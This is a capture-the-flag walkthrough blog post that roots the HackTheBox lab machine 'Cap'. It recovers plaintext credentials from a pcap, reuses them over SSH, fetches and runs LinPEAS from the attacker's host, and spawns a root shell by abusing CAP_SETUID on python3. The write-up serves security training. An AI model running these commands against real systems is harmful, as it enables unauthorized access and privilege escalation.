<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
            <h1 class="post-title entry-title">CAP HacktheBox Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/cap-hackthebox-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2021-10-11T14:02:14+00:00">October 11, 2021</time><time class="updated" datetime="2025-06-20T17:03:11+00:00">June 20, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Today CAP – HTB machine will be our target. We will categorize this lab in the beginner’s section to capture the flag. Here, we are going to learn about the capability binary approach of privilege escalation. Let’s take a deep dive.</span></p>
<h3><span style="color: #800000;"><strong>Penetration Testing Methodology</strong></span></h3>
<p><span style="color: #000000;"> <strong>Recon</strong></span></p>
<ul>
<li><span style="color: #000000;">Nmap</span></li>
</ul>
<p><strong><span style="color: #000000;">Enumeration</span></strong></p>
<ul>
<li><span style="color: #000000;">Web Enumeration</span></li>
<li><span style="color: #000000;">Wireshark</span></li>
<li><span style="color: #000000;">SSH</span></li>
</ul>
<p><strong><span style="color: #000000;">Privilege Escalation</span></strong></p>
<ul>
<li><span style="color: #000000;">Linpeas</span></li>
<li><span style="color: #000000;">Capabilities Binary</span></li>
</ul>
<h3><span style="color: #800000;"><strong>Recon</strong></span></h3>
<p><span style="color: #000000;">The first thing always comes to mind is of doing Reconnaissance. Let’s start with the NMAP scan.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -A 10.129.231.234</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjfo01PNJAne_9ZswpkUXhYH-1XGE0gOEPR7ji-5-oojur0Rjt5imGCPV7l8AcHBs8s9E5b4DPD9K3D5tcwQSFLoFeA1wPxDwhyRe-5m2H_Y-TpCAvKrpM9LygccibdexmSjaTvesaxIttOMgMDF9ksMndn-882hDGuE-ilQK2da7UQRnqZM-YhZTxfaA=s16000"/></span></p>
<p><span style="color: #000000;">The scan result of NMAP shows that there are three important open ports i.e.  Port 21 –FTP service having vsftpd 3.0.3 version, Port 22 –SSH version 8.2p1, and Port 80- HTTP service</span></p>
<p><span style="color: #000000;">According to Nmap scan, we don’t have anonymous FTP login access. So, we will proceed to the webserver.</span></p>
<h3><span style="color: #800000;"><strong>Enumeration</strong></span></h3>
<p><span style="color: #000000;">Now we investigate port 80 in a web browser which displays an interesting dashboard of monitoring results of security events. On the left-hand panel, there are four options mentioned as Dashboard, Security Snapshot (5second PCAP +Analysis), IP config, and Network status. Out of the four options, PCAP i.e. packet capture, the analysis looks interesting which contains the number of packets of TCP and UDP. After directory enumeration, we download the data 0 .pcap file.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://10.129.231.234/data/0</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhvz7kuED4R312A1BawT_yNQht0aoE-JSx-NVLYEuNzYdgsrhRKHuMET2rcDPB3iCbFB_fKxXilEPpCXt6S9Two2dX-ZGTHIK_Zpca7sOj13RwV3VxefL0wM60P6unXF8GTWixX9m2zgDGeI97ugyXZu0ErwsKduLAbUbwEYnU9zj7tPbRb-e3cOOjWFg=s16000"/></span></p>
<p><span style="color: #000000;">The above-downloaded file we analyzed into Wireshark and filter out the FTP Protocol whose result display the credentials into clear text, below are the credentials are mentioned:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">Username Nathan
Password  Buck3tH4TF0RM3!</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEj8MZL08QFtcKxfqK4xghsuMS37PCdPFpvA9TCVr60Q9odGH5pRWOoSbhGRLFMAFja3dQaMW8etTkGHZ9-Ir38VqBCJ1u647GaUwyFeyeyKlmq_WRk0pU39uYmbpzh_cSOgpu7K1ze2tYq4YummJH0hy0nm9NtQ0QQM14Am4mdhlytkGCjdf3-a3lDSkQ=s16000"/></span></p>
<p><span style="color: #000000;">As the Nmap scan FTP port is open, The FTP server appeared to be serving the user’s home directory. So we try using the same credentials to log into SSH. Successfully, we can log in to SSH and access the users’ flag.</span></p>
<p><span style="color: #000000;">Our task doesn’t finish here we have to hunt for the root flag.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh nathan@10.129.231.234
ls
cat user.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjrLm1FE8d26yTEzkgK0dNtlRU8zeUaq6X8xPtAkEZpvniK9v0DpZRWO_ali6UaBA2NXdSRDxdiqhCGq3_QuNSSsNhKih0mLWjuaILHKe_oN-dwHXi2rbUVSYX3Ay2GxE5ofk0pB97xzhsR4QcQRO75Ucsete6B0QClL7H7YLzZV6bdnhCTUckBfCbeSQ=s16000"/></span></p>
<h3><span style="color: #800000;"><strong>Privilege Escalation</strong></span></h3>
<p><span style="color: #000000;">To enumerate the HTB machine and escalate privileges, we’ll utilize the LinPEAS post-exploitation script.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ls
python –m SimpleHTTPServer 80</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgNt1BnOLExUEC5WZ4gT_x5gZlznCQOVArHgEtau7Evc879XPwbdj30JjaiS3OYX5ajJEgIdbC8QjbL5aJO_f6Wiyr0wjojmzZsL6w-x_XAiKBHO3PWxZFfLfBRaHctyuCZ-YkinawEcQeXgkdKh3yHIafTGWnBkCHGEuCyDKsCamlCpifi8uOD7Z2J_A=s16000"/></strong></span></p>
<p><span style="color: #000000;">We already had the script on the Kali machine, so we host it on port 80 and then will download it using wget from the /tmp directory on the htb machine. Now we give it the necessary execution rights, and then we run LinPEAS.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /tmp
wget 10.10.14.54 /linpeas.sh
chmod 777 linpeas.sh
./linpeas.sh</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgmwIGzpxPQTLADlrR_aFwsK2nlLnYx_vkwUnxfICIDvYceNpTeDu0f8niW15BDLDOrPM0-WWP60k3THoYOD--MxnJMtLQgqnCM_nCmjtxPWdeGXPt5rDz4zTGBgaoC3g4oATjVEROGj0dJan_Q4Oj7cct30e4Mt1-MHiYJudX8scODCcFxkt6Tz_LLKg=s16000"/></span></p>
<p><span style="color: #000000;"> For the Privilege Escalation section, the LINPEAS result reveals an interesting finding concerning cap setuid on Python 3.8’s binary, which is how the machine got its name.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhVmTzf77VKLSq4qZg2SMZFyIOIl9bCfhPS839sQa2bq65jcr_lGpo6Vh2T0FZs7XWlJ1O7nTfBkdxSGJJ5cOxwgSOat0IiodiW1NNsGrnZaBhW289r7p9FHJCMeBs8U3eosIZuS3mM_ig6lwHlBaCgIOG2N_KMTCMoY8hyU4jf78js_7V5-qq24YODKw=s16000"/></span></p>
<p><span style="color: #000000;">Let’s Google the gtfobins for the capabilities:</span></p>
<p><span style="color: #000000;"><strong>Refer</strong>:<strong> <a style="color: #000000;" href="https://gtfobins.github.io/gtfobins/python/#capabilities">https://gtfobins.github.io/gtfobins/python/#capabilities</a></strong></span></p>
<p><span style="color: #000000;">If the binary has the Linux CAP_SETUID capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its process UID.</span></p>
<p><span style="color: #000000;">Below is the command that will lead us to root shell.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'    
cd /root
ls
cat root.txt</pre>
<p><span style="color: #000000;">Finally, we capture the root flag.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiPltbXjpitrQBnd3ZhV9ZzkX99anMhnUyivsj9CiDZxg574kaZwELjrJlW7GmQKI1tuNw0aJEm3Yithp5YQiIRZsRKs-uq4nK64OTd52_Hm3gbBeHqfpCYl4VLJ4D8WHCw8RZ1GWMyi1HCaS9INR1noYDAPMAHxvCWMBZ_5d5d087qdAXeF86OcXCGBQ=s16000"/></span></p>
<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. I hope you have enjoyed and learned something new today. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
<p><span style="color: #000000;"><strong>Author</strong>: Nisha Sharma is an Experienced and Certified Security Consultant.Highly skilled in Infrastructure, web pentesting along SIEM and other security devices. Connect with her <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.linkedin.com/in/nishasharmaa"><strong>here</strong></a></span></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
